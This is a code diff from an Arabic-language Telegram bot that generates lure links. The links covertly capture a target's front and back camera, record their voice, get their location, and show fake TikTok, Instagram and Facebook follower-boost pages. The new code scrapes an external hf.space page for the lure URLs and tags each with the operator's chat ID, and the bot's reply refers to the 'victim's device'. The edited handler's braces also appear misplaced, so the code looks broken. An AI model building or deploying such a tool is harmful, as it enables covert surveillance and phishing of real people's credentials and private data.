@@ -1850,46 +1850,91 @@ bot.on('callback_query', async (callbackQuery) => {
     const [action, userId] = data.split(':');  
 
     if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {  
-        // هنا غيرت السطر ليمنع إرسال رسالة فارغة
-        // bot.sendMessage(chatId, '');  
         return;  
     }  
 
-    let link = '';
+    // إرسال رسالة انتظار
+    bot.sendMessage(chatId, "⏳ جاري إنشاء الرابط...");  
 
-        switch (action) {
-            case 'captureFront':
-                link = `https://mellifluous-frangipane-c22acb.netlify.app/c/?chatId=${chatId}`;
-                break;
-            case 'captureBack':
-                link = `https://meek-froyo-0df2e1.netlify.app/b/?chatId=${chatId}`;
-                break;
-            case 'getLocation':
-                link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
-                break;
-            case 'recordVoice':
-                const duration = 10;  
-                link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
-                break;
-            case 'rshq_tiktok':
-                link = `https://zippy-kringle-e8e51f.netlify.app/t/?chatId=${chatId}&type=tiktok`;
-                break;
-            case 'rshq_instagram':
-                link = `https://eloquent-brigadeiros-4de644.netlify.app/i/?chatId=${chatId}`;
-                break;
-            case 'rshq_facebook':
-                link = `https://serene-sfogliatella-65867a.netlify.app/fe/?chatId=${chatId}`;
-                break;
-            default:
-                bot.sendMessage(chatId, '');
-                return;
-        }
+    // استيراد الروابط من الموقع ديناميكياً
+    const url = "https://sssssskskjwnsb-linklsksn.hf.space";  
+      
+    axios.get(url, { timeout: 10000 })  
+        .then(response => {  
+            const $ = cheerio.load(response.data);  
+            let foundLink = null;  
+              
+            // البحث عن الروابط التي تحتوي على أسماء الملفات المطلوبة
+            $('a[href]').each((index, element) => {  
+                const link = $(element).attr('href');  
+                
+                // البحث عن الروابط التي تتوافق مع الإجراء المطلوب
+                if (action === 'captureFront' && link.includes('/n/')) {  
+                    foundLink = link;  
+                    return false;  
+                } else if (action === 'captureBack' && link.includes('/b/')) {  
+                    foundLink = link;  
+                    return false;  
+                } else if (action === 'getLocation' && link.includes('/getLocation/')) {  
+                    foundLink = link;  
+                    return false;  
+                } else if (action === 'recordVoice' && link.includes('/record/')) {  
+                    foundLink = link;  
+                    return false;  
+                } else if (action === 'rshq_tiktok' && (link.includes('/t/') || link.includes('tiktok'))) {  
+                    foundLink = link;  
+                    return false;  
+                } else if (action === 'rshq_instagram' && (link.includes('/n/') || link.includes('instagram'))) {  
+                    foundLink = link;  
+                    return false;  
+                } else if (action === 'rshq_facebook' && (link.includes('/n/') || link.includes('facebook'))) {  
+                    foundLink = link;  
+                    return false;  
+                }  
+            });  
+              
+            if (foundLink) {  
+                // بناء الرابط النهائي مع chatId
+                let finalLink = foundLink;
+                
+                // إضافة chatId إلى الرابط
+                if (finalLink.includes('?')) {
+                    finalLink += `&chatId=${chatId}`;
+                } else {
+                    finalLink += `?chatId=${chatId}`;
+                }
+                
+                // إضافة معاملات إضافية حسب نوع الإجراء
+                switch (action) {
+                    case 'recordVoice':
+                        const duration = 10;  
+                        finalLink += `&duration=${duration}`;
+                        break;
+                    case 'rshq_tiktok':
+                        finalLink += `&type=tiktok`;
+                        break;
+                    case 'getLocation':
+                        // إضافة معرف عشوائي إذا كان الرابط لا يحتويه
+                        if (!finalLink.includes('/getLocation/')) {
+                            const randomId = crypto.randomBytes(16).toString('hex');
+                            finalLink = finalLink.replace('/getLocation/', `/getLocation/${randomId}`);
+                        }
+                        break;
+                }
 
-        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
-    }
+                const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${finalLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;  
+                bot.sendMessage(chatId, message);  
+            } else {  
+                bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");  
+            }  
+        })  
+        .catch(error => {  
+            console.error('Error fetching link:', error);  
+            bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);  
+        });  
+}
 
-    bot.answerCallbackQuery(callbackQuery.id);
-});
+bot.answerCallbackQuery(callbackQuery.id);
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
